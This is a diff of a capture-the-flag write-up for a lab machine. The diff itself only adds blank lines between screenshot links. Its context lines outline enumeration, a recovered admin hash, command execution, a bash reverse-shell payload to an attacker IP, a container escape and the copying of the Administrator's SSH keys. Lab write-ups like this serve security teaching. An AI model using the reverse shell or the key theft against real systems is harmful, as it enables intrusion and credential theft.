@@ -66,6 +66,7 @@ Nmap done: 1 IP address (1 host up) scanned in 25.49 seconds
   - There is also a certificate for `admin.megalogistic.com`
 
 ![](./images/1.png)
+
 ![](./images/2.png)
 
 - `ffuf`
@@ -129,7 +130,9 @@ ________________________________________________
   - Retrieved admin's hash `4a100a85cb5ca3616dcf137918550815` - but failed to crack it
 
 ![](./images/8.png)
+
 ![](./images/9.png)
+
 ![](./images/10.png)
 
 - Let's try executing commands
@@ -143,6 +146,7 @@ ________________________________________________
   - Payload: `bash -c "bash -i >& /dev/tcp/10.10.16.12/6666 0>&1"` 
 
 ![](./images/12.png)
+
 ![](./images/13.png)
 
 - The flag can be found in `/var/lib/postgresql` folder
@@ -157,6 +161,7 @@ ________________________________________________
   - If we check `ifconfig`, we have `172.17.0.2` so VM is probably `.1`
 
 ![](./images/14.png)
+
 ![](./images/15.png)
 
 - We have `sudo` rights
@@ -175,10 +180,12 @@ ________________________________________________
   - So `Users` is probably mounted to `c`
 
 ![](./images/18.png)
+
 ![](./images/19.png)
 
 - If we check `Administrator`'s directory we find `.ssh` folder which contains his keys
   - Let's copy them and connect
 
 ![](./images/20.png)
+
 ![](./images/21.png)
